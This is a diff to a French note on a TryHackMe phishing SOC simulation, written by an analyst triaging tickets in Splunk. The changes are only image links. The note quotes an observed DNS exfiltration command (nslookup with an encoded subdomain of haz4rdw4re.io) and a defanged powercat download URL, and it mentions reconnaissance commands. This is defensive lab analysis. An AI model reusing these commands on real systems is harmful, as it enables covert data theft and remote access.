@@ -6,7 +6,7 @@ tags:
 ---
 ## Contexte
 De la même manière que [[Introduction to phishing]], ce challenge consiste en une simulation de SOC orienté menace Phishing.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U.png]]
+![[THM_P-U.png]]
 Nous allons donc avoir accès à une interface de ticketing classique, nous devrons les analyser (en utilisant des outils comme Splunk), puis répondre aux tickets en expliquant la situation, les impacts, les actions recommandées et décider si un passage au niveau 2 (pour plus d'analyse) est requis ou non.
 
 Pour remplir les tickets, je vais utiliser le format suivant, le principe est d'être le plus synthétique possible pour faire gagner le plus de temps possible aux analystes SOC L2.
@@ -40,7 +40,7 @@ Aussi, il faut savoir que le challenge se termine lorsque tous les vrais positif
 Voici des données qui sont à notre disposition dans ce challenge.
 
 Le contexte est le même que pour [[Introduction to phishing]], la seule différence ce sont les employés :
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_employee.png]]
+![[THM_P-U_employee.png]]
 Et cette fois-ci, on n'a pas les IPs associées.
 
 >[!warning] Attention
@@ -49,12 +49,12 @@ Et cette fois-ci, on n'a pas les IPs associées.
 ## Tickets
 
 ### Ticket 1000
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1000.png]]
+![[THM_P-U_T1000.png]]
 Pour ce premier ticket, un email suspicieux a été reçu par un expéditeur externe avec un TLD inhabituel.
 Mais apparemment, cette règle de détection pourrait avoir encore besoin d'un peu de réglage.
 
 En recherchant l'adresse mail de l'expéditeur dans splunk on trouve le mail en question :
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1000_Splunk.png]]
+![[THM_P-U_T1000_Splunk.png]]
 On ne trouve rien de plus. Ce qui veut donc dire qu'il n'y a pas eu de mail retour vers eileen. C'est donc juste un Vrai Positif, mais sans impact ni remonté en L2 nécessaire.
 ```
 Who: support@tryhatme.com support
@@ -83,12 +83,12 @@ Delete the email and blacklist the IP and sender email.
 ```
 
 ### Ticket 1003
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1003.png]]
+![[THM_P-U_T1003.png]]
 Cette fois-ci c'est similaire au ticket T1000.
 L'expéditeur : leonard@fashionindustrytrends.xyz et la cible, c'est yani.zubair@tryhatme.com du service IT, avec le pc win-3449.
 Toujours pas de pièce jointe.
 Ça promet de gagner une stratégie pour se faire un vrai empire juste en cliquant sur un lien… qu'ils ne donnent pas.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1003_Splunk.png]]
+![[THM_P-U_T1003_Splunk.png]]
 De la même façon que pour T1000, on retrouve le log dans Splunk mais rien d'autre, il n'y a donc pas eu d'intéractions autre que la réception du mail.
 ```
 Who: Yani Zubair, yani.zubair@tryhatme.com, win-3449, IT department
@@ -116,26 +116,26 @@ Delete the email and blacklist the IP and sender email.
 ```
 
 ### Ticket 1025
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025.png]]
+![[THM_P-U_T1025.png]]
 Cette fois-ci c'est un process qui s'est lancé avec un parent non commun sur le pc win-3450 (Michael Ascot, CEO, michael.ascot@tryhatme.com), le process, c'est `nslookup.exe` avec pid 5520 et le ppid 3728. Le dossier touché, c'est `C:\Users\michael.ascot\downloads\exfiltration\` via la commande : `"C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io`
 
 C'est donc de sévérité Haute et demande élévation au niveau L2. C'est de l'exfiltration de données.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025_Splunk.png]]
+![[THM_P-U_T1025_Splunk.png]]
 On cherchant l'identifiant de machine sur Splunk, on peut voir pleins d'exfiltration à ce moment.
 Et en remontant encore plus loin dans le temps, on peut retrouver des traces de téléchargement via Powershell comme hxxps[://]raw[.]githubusercontent[.]com/besimorhino/powercat/master/powercat[.]ps1)
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1015_Splunk2.png]]
+![[THM_P-U_T1015_Splunk2.png]]
 On peut aussi voir des `whoami` et des `systeminfo` avoir été réalisé.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025_Splunk3.png]]
+![[THM_P-U_T1025_Splunk3.png]]
 Tout ça nous prouve que son compte l'attaquant a cherché des infos sur la machine et les privilèges de l'utilisateur compromis. On est donc plus que sûr que c'est un Vrai Positif.
 
 Et on peut même trouver juste avant ces évènements un fichier Zip (ImportantInvoice-Febrary.zip) créé puis ouvert provenant d'un mail sur la boite mail du CEO.
 Le fichier a été téléchargé dans le dossier `/downloads` avant que le dossier `/exfiltration` ne soit créé.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025_Splunk4.png]]
+![[THM_P-U_T1025_Splunk4.png]]
 Et le mail à l'origine de tout ça, c'est celui-là : 
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025_Mail.png]]
+![[THM_P-U_T1025_Mail.png]]
 On y voit bien un phishing classique, où l'attaquant lui met la pression en lui disant qu'il n'avait pas payé une facture et que son compte allait être suspendu s'il ne payait pas dans les 24 heures. Avec en pièce jointe le .zip malicieux.
 Zip qui d'ailleurs n'est pas considéré comme malicieux par TryDetectThis :
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1025_TDT.png]]
+![[THM_P-U_T1025_TDT.png]]
 
 ```
 Who: Michael Ascot, CEO, michael.ascot@tryhatme.com, win-3450
@@ -178,12 +178,12 @@ Recommended actions:
 
 Les tickets liés au 1025 sont : 1005, 1020, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034.
 ### Ticket 1022 et 1024
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1022.png]]
+![[THM_P-U_T1022.png]]
 C'est encore un ticket lié au CEO (le pauvre, il en prend plein la poire).
 Mais ça a l'air un peu plus spécifique que pour le 1025 puisque cette fois, c'est un disque qui a été mappé sur le stockage local de la machine du CEO, j'imagine que c'est pour mieux exfiltrer les données.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1024.png]]
+![[THM_P-U_T1024.png]]
 Le 1024 est la suite logique parce que c'est le fait de le déconnecté de l'espace local de la machine.
-![[content/Notes/TryHackMe/Phishing Unfolding/THM_P-U_T1022_Splunk.png]]
+![[THM_P-U_T1022_Splunk.png]]
 On peut donc retrouver les logs dans Splunk : 
 04/29/2026 20:16:16.075 -> CEO copie SSF-FinancialRecords sur un disque local
 04/29/2026 20:17:14.075 -> ce disque local est déconnecté
